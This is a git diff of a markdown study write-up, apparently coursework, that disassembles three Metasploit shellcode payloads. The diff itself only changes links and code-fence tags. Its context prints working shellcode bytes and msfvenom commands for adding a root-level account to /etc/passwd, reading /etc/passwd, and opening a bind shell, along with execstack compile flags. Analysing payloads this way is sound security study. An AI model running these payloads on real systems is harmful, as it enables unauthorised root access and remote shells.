@@ -14,18 +14,21 @@
 
 Payloads studied:
 
-- Payload [*linux/x86/adduser*](https://github.com/ricardojoserf/slae/tree/master/ex5/1_adduser)
+- Payload [*linux/x86/adduser*](https://github.com/ricardojoserf/slae/tree/master/a5_Shellcode_Functionality/1_adduser)
 
-- Payload [*linux/x86/read_file*](https://github.com/ricardojoserf/slae/tree/master/ex5/2_readfile)
+- Payload [*linux/x86/read_file*](https://github.com/ricardojoserf/slae/tree/master/a5_Shellcode_Functionality/2_readfile)
 
-- Payload [*linux/x86/shell_bind_tcp_random_port*](https://github.com/ricardojoserf/slae/tree/master/ex5/3_bindrandomport)
+- Payload [*linux/x86/shell_bind_tcp_random_port*](https://github.com/ricardojoserf/slae/tree/master/a5_Shellcode_Functionality/3_bindrandomport)
+
+
+---------------------------------------------------
 
 
 ## 5.1 Payload *linux/x86/adduser*
 
 
 ### Check options
-```
+```bash
 msfvenom -p linux/x86/adduser --list-options
 ```
 
@@ -42,7 +45,7 @@ There are 3 basic options:
 
 For this study we will use the three basic options:
 
-```
+```bash
 msfvenom -p linux/x86/adduser USER=ricardo PASS=sectube SHELL=/bin/bash --platform=Linux -a x86 -f c
 ```
 
@@ -51,7 +54,7 @@ msfvenom -p linux/x86/adduser USER=ricardo PASS=sectube SHELL=/bin/bash --platfo
 
 The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:
 
-```
+```bash
 msfvenom -p linux/x86/adduser --platform=Linux -a x86 -f c USER=ricardo PASS=sectube SHELL=/bin/bash | grep '"' | sed -e 's/\"//g' | paste -sd "" - | tr ";" " "
 ```
 
@@ -73,14 +76,14 @@ When the PNG picture is generated it is empty.
 
 With ndisasm it is possible to get the .nasm code using:
 
-```
+```bash
 msfvenom -p linux/x86/adduser --platform=Linux -a x86 -f raw USER=ricardo PASS=sectube SHELL=/bin/bash | ndisasm -u -
 ```
 
 
 Or a little quicker:
 
-```
+```bash
 echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
 ```
 
@@ -88,7 +91,7 @@ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x
 
 Using awk it is possible to get only the part we want and create a .nasm file:
 
-```
+```bash
 echo -e "section .text\nglobal _start \n_start:" > 1.nasm
 
 echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 1.nasm
@@ -161,7 +164,7 @@ Next, the executable gets generated using the *shellcode.c* script:
 
 It is compiled:
 
-```
+```bash
 gcc -fno-stack-protector -z execstack shellcode.c -o 1
 ```
 
@@ -181,7 +184,7 @@ Also note that if we study the binary there are interesting strings we can find 
 
 First, the executable is attached in quiet mode:
 
-```
+```bash
 gdb -q 1
 ```
 Then, we set the disassembly flavor and jump into the "main" function (the one from shellcode.c):
@@ -290,6 +293,10 @@ Now we can update the nasm code deleting the unused opcodes and adding the strin
 Finally we can compile the nasm file and check it works correctly:
 
 ![Screenshot](images/adduser/34.png)
+
+
+----------------------------------------------
+
 ## 5.2 Payload *linux/x86/read_file*
 
 ### Check options
@@ -310,7 +317,7 @@ There are 3 basic options:
 
 For this study we will use the basic options:
 
-```
+```bash
 msfvenom -p linux/x86/read_file FD=1 PATH=/etc/passwd --platform=Linux -a x86 -f c
 ```
 
@@ -319,7 +326,7 @@ msfvenom -p linux/x86/read_file FD=1 PATH=/etc/passwd --platform=Linux -a x86 -f
 
 The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:
 
-```
+```bash
 msfvenom -p linux/x86/read_file --platform=Linux -a x86 -f c FD=1 PATH=/etc/passwd | grep '"' | sed -e 's/\"//g' | paste -sd "" - | tr ";" " "
 ```
 
@@ -341,14 +348,14 @@ When the PNG picture is generated it is empty.
 
 With ndisasm it is possible to get the .nasm code using:
 
-```
+```bash
 msfvenom -p linux/x86/read_file --platform=Linux -a x86 -f raw FD=1 PATH=/etc/passwd | ndisasm -u -
 ```
 
 
 Or a little quicker:
 
-```
+```bash
 echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -
 ```
 
@@ -357,7 +364,7 @@ echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x
 
 Using awk it is possible to get only the part we want and create a .nasm file:
 
-```
+```bash
 echo -e "section .text\nglobal _start \n_start:" > 2.nasm
 
 echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 2.nasm
@@ -398,7 +405,7 @@ Next, the executable gets generated using the *shellcode.c* script:
 
 It is compiled:
 
-```
+```bash
 gcc -fno-stack-protector -z execstack shellcode.c -o 2
 ```
 
@@ -416,7 +423,7 @@ Also note that if we study the binary there are interesting strings we can find 
 
 First, the executable is attached in quiet mode:
 
-```
+```bash
 gdb -q 2
 ```
 Then, we set the disassembly flavor, define the "hook-stop" function, and jump into the "main" function (the one from shellcode.c):
@@ -529,10 +536,15 @@ Now we can update the nasm code deleting the unused opcodes and adding the strin
 Finally we can compile the nasm file and check it works correctly:
 
 ![Screenshot](images/read_file/25.png)
+
+
+----------------------------------------------------
+
+
 ## 5.3 Payload *linux/x86/shell_bind_tcp_random_port*
 
 ### Check options
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --list-options
 ```
 
@@ -544,7 +556,7 @@ There is not any basic option in this case.
 
 For this study we will use the basic command:
 
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c
 ```
 
@@ -552,7 +564,7 @@ msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c
 
 The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:
 
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | grep '"' | sed -e 's/\"//g' | paste -sd "" -
 ```
 
@@ -566,14 +578,14 @@ Using it, we get the shellcode we will use for the study of the payload:
 
 Before studying the syscalls, the .nasm code is extracted using Ndisasm:
 
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | ndisasm -u -
 ```
 
 
 Or a little quicker:
 
-```
+```bash
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u -
 ```
 
@@ -581,7 +593,7 @@ echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x
 
 Using awk it is possible to get only the part we want and create a .nasm file:
 
-```
+```bash
 echo -e "section .text\nglobal _start \n_start:" > 3.nasm
 
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 3.nasm
@@ -595,7 +607,7 @@ echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x
 
 In this case Libemu works correctly:
 
-```
+```bash
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" |  ./sctest -vvv -Ss 10000 -G randbind.dot
 ```
 
@@ -603,7 +615,7 @@ echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x
 
 We get the next output:
 
-```
+```cpp
 int socket (
      int domain = 2;
      int type = 1;
@@ -694,7 +706,7 @@ int execve (
 
 Finally the PNG picture is created using:
 
-```
+```bash
 dot randbind.dot -T png -o randbind.png
 ```
 
@@ -754,7 +766,7 @@ So again, itt is necessary to use the *shellcode.c* file:
 
 It is compiled:
 
-```
+```bash
 gcc -fno-stack-protector -z execstack shellcode.c -o 3
 ```
 
